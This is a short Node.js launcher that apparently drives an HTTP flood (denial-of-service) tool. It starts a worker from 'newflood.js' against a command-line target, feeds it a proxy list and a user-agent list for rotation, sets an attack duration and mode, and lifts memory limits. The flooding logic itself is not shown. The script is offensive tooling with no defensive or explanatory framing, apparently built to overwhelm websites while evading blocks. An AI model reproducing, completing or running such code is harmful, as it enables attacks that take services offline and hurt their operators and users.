const {
    Worker
} = require('worker_threads'), fs = require('fs');
new Worker('./newflood.js', {
    workerData: {
        target: process.argv[2],
        proxies: [...new Set(fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n'))],
        userAgents:[...new Set(fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n'))],
        referers: [],
        duration: process.argv[3] * 1e3,
        opt: { ratelimit: true },
        mode: process.argv[4]
    },
    resourceLimits: {
        maxOldGenerationSizeMb: Infinity,
        maxYoungGenerationSizeMb: Infinity,
        codeRangeSizeMb: Infinity
    }
}).on('exit', code => {
    if (code) {
        switch (code) {
            case '20':
                //Target with too big body, blacklist the target.

                break;
        }
    }
}).setMaxListeners(0);